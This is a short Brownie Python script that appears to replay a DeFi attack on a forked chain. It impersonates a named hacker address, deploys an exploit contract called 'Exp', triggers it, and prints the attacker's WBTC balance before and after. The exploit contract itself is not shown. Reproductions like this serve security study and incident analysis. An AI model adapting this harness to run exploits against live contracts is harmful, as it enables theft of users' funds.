from brownie import accounts, Exp, interface
from rich import print as rp

def main():
    rp('[bold green]------------ Supremacy Inc. ------------[/]')
    rp('[bold green]------------- Web3.0 Rekt -------------[/]\n')
    wbtc = interface.IERC20('0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599')
    hacker = accounts.at('0xc95C558dAA63b1A79331B2AB4a2a7af375384d3B', force=True)

    exp = Exp.deploy({
        'from': hacker
    })

    rp(f'🧛[bold green] Amount of profit made by hackers before the attack: {wbtc.balanceOf(hacker)} WBTC')    

    exp.trigger()

    rp(f'🧛[bold green] Amount of profit made by hackers after the attack: {wbtc.balanceOf(hacker) / 1e8} WBTC')